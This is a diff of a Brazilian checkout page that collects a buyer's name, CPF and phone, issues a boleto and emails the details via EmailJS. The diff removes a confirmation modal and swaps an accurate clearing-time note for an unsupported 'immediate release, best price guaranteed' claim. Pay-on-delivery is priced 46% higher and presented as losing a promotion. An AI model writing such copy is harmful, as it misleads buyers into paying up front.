@@ -44,7 +44,6 @@
             --pix-color: var(--primary);
             --pix-bg: #f0fffe;
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: var(--bg-light); color: var(--text-dark); line-height: 1.6; scroll-behavior: smooth; }
         body { min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 0; background-color: var(--bg-light); }
@@ -81,7 +80,6 @@
         .pix-input-group input:focus { border-color: var(--primary); }
         .input-check-icon { position: absolute; right: 14px; bottom: 12px; color: var(--success); font-size: 1rem; opacity: 0; transform: scale(0.5); transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); pointer-events: none; z-index: 5; }
         .input-check-icon.visible { opacity: 1; transform: scale(1); }
-        .pix-input-group .input-check-icon { bottom: 14px; }
         .payment-action-btn { background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 1rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.2s; }
         .pix-error-msg { display: none; color: var(--danger); font-size: 0.8rem; align-items: center; gap: 5px; }
         .pix-error-msg.visible { display: flex; }
@@ -126,29 +124,14 @@
         .form-group { display: flex; flex-direction: column; gap: 6px; position: relative; }
         .form-group label { font-size: 0.8rem; font-weight: 700; color: var(--text-dark); }
         .form-group input { padding: 12px; border: 2px solid var(--border-color); border-radius: 10px; outline: none; }
-        .form-group input:focus { border-color: var(--primary); }
         .btn-send-form { background: var(--primary); color: white; margin-top: 10px; }
         .delivery-warning-container { display: none; flex-direction: column; gap: 10px; margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border-color); }
         .payment-option-card.selected .delivery-warning-container { display: flex; }
         .delivery-warning-box { background: #fff7ed; border: 1px solid #ffedd5; padding: 12px; border-radius: 12px; display: flex; gap: 10px; }
         .delivery-warning-text { font-size: 0.8rem; color: #9a3412; line-height: 1.4; }
-        .pix-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(12px); z-index: 2000; display: none; align-items: center; justify-content: center; padding: 16px; }
-        .pix-modal-overlay.active { display: flex; }
-        .pix-modal-content { background: white; width: 100%; max-width: 380px; border-radius: 20px; padding: 24px; position: relative; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); animation: modalIn 0.3s ease-out; }
-        .pix-modal-header { text-align: center; margin-bottom: 16px; }
-        .pix-modal-header i { font-size: 2rem; color: #22c55e; margin-bottom: 8px; display: block; }
-        .pix-modal-header h2 { font-size: 1.25rem; font-weight: 800; color: #0f172a; }
-        .pix-instructions-list { background: #f8fafc; border-radius: 12px; padding: 16px; margin-bottom: 16px; border: 1px solid #e2e8f0; }
-        .pix-instructions-list ul { list-style: none; display: flex; flex-direction: column; gap: 10px; }
-        .pix-instructions-list li { display: flex; align-items: center; gap: 12px; font-size: 0.8rem; color: #475569; font-weight: 600; }
-        .pix-instructions-list li i { color: #0055ff; width: 20px; text-align: center; }
-        .pix-code-container-compact { background: #f1f5f9; border-radius: 10px; padding: 8px; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; border: 1px dashed #cbd5e1; }
-        .pix-code-input-compact { flex: 1; background: transparent; border: none; font-family: monospace; font-size: 0.75rem; color: #64748b; outline: none; overflow: hidden; text-overflow: ellipsis; }
-        .pix-copy-btn-compact { background: #0f172a; color: white; border: none; padding: 8px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 700; cursor: pointer; }
-        .pix-modal-close-compact { width: 100%; padding: 14px; background: #0055ff; color: white; border: none; border-radius: 12px; font-size: 0.95rem; font-weight: 800; cursor: pointer; }
-        .pix-modal-external-close { position: absolute; top: 15px; right: 15px; background: transparent; border: none; color: #94a3b8; cursor: pointer; }
         .spinner { width: 20px; height: 20px; border: 2px solid rgba(255, 255, 255, 0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -203,26 +186,6 @@
                 <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
                 <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
             </div>
-        </div>
-    </div>
-
-    <div id="pixCopiedModal" class="pix-modal-overlay">
-        <div class="pix-modal-content">
-            <button class="pix-modal-external-close" onclick="fecharPixModalDireto()"><i class="fas fa-times"></i></button>
-            <div class="pix-modal-header"><i class="fas fa-check-circle"></i><h2>Boleto Gerado!</h2></div>
-            <div class="pix-instructions-list">
-                <ul>
-                    <li><i class="fas fa-barcode"></i> Copie a linha digitável abaixo</li>
-                    <li><i class="fas fa-mobile-alt"></i> Pague no app do seu banco</li>
-                    <li><i class="fas fa-file-pdf"></i> Ou baixe o PDF para imprimir</li>
-                </ul>
-            </div>
-            <div class="pix-code-container-compact">
-                <input type="text" id="pixCodeCopied" class="pix-code-input-compact" readonly>
-                <button class="pix-copy-btn-compact" onclick="copyAgain()">Copiar</button>
-            </div>
-            <button class="pix-modal-close-compact" id="btn-download-pdf-modal" onclick="window.open(lastBoletoUrl, '_blank')">BAIXAR BOLETO (PDF)</button>
-            <button class="pix-modal-close-compact" style="margin-top: 10px; background: #64748b;" onclick="fecharPixModalDireto()">ENTENDI</button>
         </div>
     </div>
 
@@ -295,7 +258,7 @@
                             <div class="payment-option-icon"><i class="fas fa-barcode"></i></div>
                             <div class="payment-option-title">Boleto Bancário</div>
                             <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
-                            <div class="payment-option-desc">Pague em qualquer banco ou lotérica. Compensação em até 1 dia útil.</div>
+                            <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
                             <div class="pix-form-container" id="pix-form" style="display: flex;">
                                 <div class="pix-input-group"><label for="pix-name">Nome e Sobrenome</label><input type="text" id="pix-name" placeholder="Ex: João Silva" required></div>
                                 <div class="pix-input-group"><label for="pix-cpf">CPF</label><input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required></div>
@@ -304,16 +267,16 @@
                                 <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;"><span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span></button>
                             </div>
                             <div id="pix-copy-content" class="pix-copy-section">
-                                <div class="pix-header-status"><div class="pix-status-badge"><i class="fas fa-check-circle"></i> Boleto Gerado</div><div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">72:00</span></div></div>
+                                <div class="pix-header-status"><div class="pix-status-badge"><i class="fas fa-check-circle"></i> Boleto Gerado</div><div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">72:00:00</span></div></div>
                                 <div class="duty-info-section"><div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div><div class="duty-user-data"><div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div><div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div></div><div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este boleto é nominal e vinculado ao seu CPF.</span></div></div>
                                 <div class="pix-code-display-wrapper"><div class="pix-code-header"><label class="pix-code-label">Linha Digitável</label><span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span></div><div class="pix-code-input-container"><span class="pix-code-display-text" id="pix-code-text">Aguardando...</span><button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar"><i class="fas fa-copy"></i></button></div></div>
                                 <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar Linha Digitável</button>
                                 <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
-                                <button class="btn-copy-pix" style="margin-top: 10px; background: #28a745;" onclick="window.open(lastBoletoUrl, '_blank')">Visualizar Boleto (PDF)</button>
+                                <button class="btn-modal-continue" id="btn-already-paid" style="margin-top: 10px; padding: 14px; border-radius: 12px; font-size: 0.95rem; border: none; cursor: pointer; width: 100%; font-weight: 800; background: var(--primary); color: white;" onclick="window.open(lastBoletoUrl, '_blank')">Baixar Boleto (PDF)</button>
                             </div>
                         </div>
                         <div class="payment-option-card" id="pay-on-delivery">
-                            <div class="promo-badge" style="background: var(--text-light);">Sem Desconto</div>
+                            <div class="promo-badge" style="background: var(--text-light); position: absolute; top: 12px; right: -30px; color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
                             <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
                             <div class="payment-option-title">Pagar na Entrega</div>
                             <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
@@ -330,7 +293,6 @@
             setupNameInput(document.getElementById('pix-name'));
             setupCPFInput(document.getElementById('pix-cpf'));
             setupPhoneInput(document.getElementById('pix-phone'));
-
             const pixCard = document.getElementById('pay-now-pix');
             const deliveryCard = document.getElementById('pay-on-delivery');
             pixCard.addEventListener('click', (e) => {
@@ -372,8 +334,6 @@
                     document.getElementById('display-pix-name').innerText = name;
                     document.getElementById('display-pix-cpf').innerText = cpfRaw;
                     document.getElementById('pix-code-text').innerText = data.pixCode;
-                    document.getElementById('pixCodeCopied').value = data.pixCode;
-                    document.getElementById('pixCopiedModal').classList.add('active');
                     startTimer(72 * 3600);
                 } else { errorText.textContent = data.error || 'Erro ao gerar boleto.'; errorEl.classList.add('visible'); }
             } catch (err) { errorText.textContent = 'Erro de conexão.'; errorEl.classList.add('visible'); }
@@ -391,15 +351,12 @@
 
         async function sendEmailJS(name, cpf, phone, valor) { try { await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, { payer_name: name, payer_cpf: cpf, payer_phone: phone, payer_valor: 'R$ ' + parseFloat(valor).toFixed(2).replace('.', ',') }); } catch (err) { console.error(err); } }
         function copyPixCode() { const code = document.getElementById('pix-code-text').innerText; navigator.clipboard.writeText(code).then(() => { alert('Copiado!'); }); }
-        function copyAgain() { const code = document.getElementById('pixCodeCopied').value; navigator.clipboard.writeText(code).then(() => { alert('Copiado!'); }); }
         function showDeliveryModal() { document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${(subtotalValue * 1.46).toFixed(2).replace('.', ',')}</strong> total e perde a promoção de <strong>R$ ${subtotalValue.toFixed(2).replace('.', ',')}</strong>`; document.getElementById('delivery-modal').classList.add('active'); }
-        function fecharPixModalDireto() { document.getElementById('pixCopiedModal').classList.remove('active'); }
         document.getElementById('modal-close-btn-delivery').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
         document.getElementById('modal-back-to-pix').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
         document.getElementById('modal-continue-delivery').onclick = () => { document.getElementById('modal-step-1').style.display = 'none'; document.getElementById('modal-step-2').style.display = 'block'; };
         document.getElementById('delivery-contact-form').onsubmit = (e) => { e.preventDefault(); sendEmailJS(document.getElementById('delivery-name').value, document.getElementById('delivery-cpf').value, document.getElementById('delivery-phone').value, subtotalValue * 1.46); document.getElementById('modal-step-2').style.display = 'none'; document.getElementById('modal-step-3').style.display = 'block'; };
         document.getElementById('modal-close-final').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
-
         window.onload = () => { renderOrderSummary(); renderPaymentOptions(); };
     </script>
 </body>
